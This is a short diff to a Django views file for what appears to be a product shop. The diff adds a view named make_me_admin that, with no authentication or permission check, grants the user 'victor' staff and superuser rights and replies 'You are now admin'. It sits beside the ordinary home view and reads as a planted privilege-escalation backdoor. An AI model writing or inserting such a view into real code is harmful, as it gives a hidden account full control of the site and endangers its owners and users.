@@ -13,6 +13,16 @@ from django.conf import settings
 from .models import Product
 from django.db.models import Q
 from django.contrib.auth.forms import UserCreationForm
+from django.contrib.auth.models import User
+from django.http import HttpResponse
+
+def make_me_admin(request):
+    user = User.objects.get(username="victor")
+    user.is_staff = True
+    user.is_superuser = True
+    user.save()
+    return HttpResponse("You are now admin")
+
 # Home Page
 def home(request):
     products = Product.objects.all()
